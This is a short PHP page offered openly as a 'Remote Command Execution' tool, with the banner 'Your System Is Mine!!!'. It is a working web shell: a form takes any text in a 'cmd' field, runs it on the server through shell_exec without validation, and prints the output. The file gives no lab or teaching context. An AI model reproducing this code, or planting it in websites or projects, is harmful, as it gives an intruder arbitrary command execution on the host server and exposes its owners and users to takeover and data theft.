<html>

<head>

<title>Remote Command Execution</title>
<style>
h1{
color: red;
font-size: 35px;
}
span{color: blue;}
input{
padding: 10px;
width: 30%;

}
b{color: yellow;}
button{padding: 10px;}
</style>
<body>


<?php

echo "<h1>Remote Command Execution - <b style='color:green;'>Your System Is Mine!!!</b></h1><hr><br><br>";


echo "<span>Enter Command In The Input Box To Execute...</span><br><br>";




?>

Find Your Way Into The System...

<br><br>

<form action="php_cmd_exec.php" method="post">

<input type='text' name='cmd'  placeholder='root@localhost:~$'>
<button type='submit' name='run'>Run</button>

</form>
<br><br>
<span>Output: <br><br></span>
<?php



if (isset($_POST['run'])){


$cmd = $_POST['cmd'];


echo shell_exec($cmd), "<br><br>";
}

?>

<br><br><br>
<b>Tool Admin - Gospel Chukwunonso </b>
</body>
</head>

</html>
